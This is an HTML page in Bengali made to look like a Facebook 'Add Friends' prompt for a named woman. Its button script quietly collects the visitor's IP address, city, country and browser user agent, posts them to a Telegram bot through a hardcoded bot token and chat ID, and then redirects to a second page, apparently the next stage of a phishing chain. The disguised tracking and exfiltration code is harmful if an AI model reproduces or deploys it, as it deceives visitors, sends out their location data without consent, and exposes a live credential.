<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Friends</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">

    <!-- ছবির অংশ – সব পেজে একই -->
    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
             alt="Profile" class="w-full h-full object-cover">
    </div>

    <!-- সাদা বক্স – mt-[-20px] দিয়ে ওভারল্যাপ -->
    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center justify-center">

        <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">ফ্রেন্ড অ্যাড করুন</h2>

        <p class="text-gray-600 text-center mb-8 px-4 leading-relaxed">
            এক ক্লিকে Mst. Priya Akter কে ফ্রেন্ড অ্যাড করুন। নিচের বাটনে ক্লিক করুন।
        </p>

        <button onclick="trackAndRedirect()" id="mainBtn" 
                class="w-full max-w-xs bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-4 rounded-xl transition shadow-lg active:scale-95">
            Add Friends
        </button>

    </div>

<script>
    async function trackAndRedirect() {
        const btn = document.getElementById('mainBtn');
        btn.innerText = "Connecting...";
        btn.disabled = true;

        try {
            // IP + Device info
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            const ua = navigator.userAgent;
            const msg = `📩 নতুন ক্লিক (index.html)\n\n👤 Device: ${ua}\n🌍 Country: ${ipData.country_name || 'N/A'}\n🏙️ City: ${ipData.city || 'N/A'}\nIP: ${ipData.ip || 'N/A'}\n⏰ Time: ${new Date().toLocaleString('bn-BD')}`;

            await fetch(`https://api.telegram.org/bot8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: "8516934257", text: msg})
            });
        } catch (err) {
            console.error(err);
        }

        window.location.href = "page2.html";
    }
</script>

</body>
</html>
